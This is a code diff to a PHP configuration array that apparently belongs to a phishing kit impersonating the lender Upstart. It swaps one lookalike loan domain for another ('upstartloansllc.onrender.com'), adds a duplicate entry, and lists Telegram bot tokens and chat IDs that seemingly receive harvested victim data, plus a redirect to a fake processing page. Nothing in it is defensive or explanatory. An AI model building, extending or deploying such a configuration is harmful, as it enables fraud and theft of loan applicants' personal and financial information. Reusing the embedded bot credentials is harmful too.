@@ -16,13 +16,23 @@ $site_map = [
 
 
 
-    'upstartloans.42web.io' => [
+    'upstartloansllc.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '7589021236:AAEvlKCDI2Iyav0rECK-ptn2LR-alBxINpA', 'chat_id' => '1106032838']
 
         ],
-        'redirect' => 'https://upstartloans.42web.io/cache_site/processing.html'
+        'redirect' => 'https://upstartloansllc.onrender.com/processing.html'
+    ],
+
+
+    'upstartloansllc.onrender.com' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '7589021236:AAEvlKCDI2Iyav0rECK-ptn2LR-alBxINpA', 'chat_id' => '1106032838']
+
+        ],
+        'redirect' => 'https://upstartloansllc.onrender.com/processing.html'
     ],
 
 
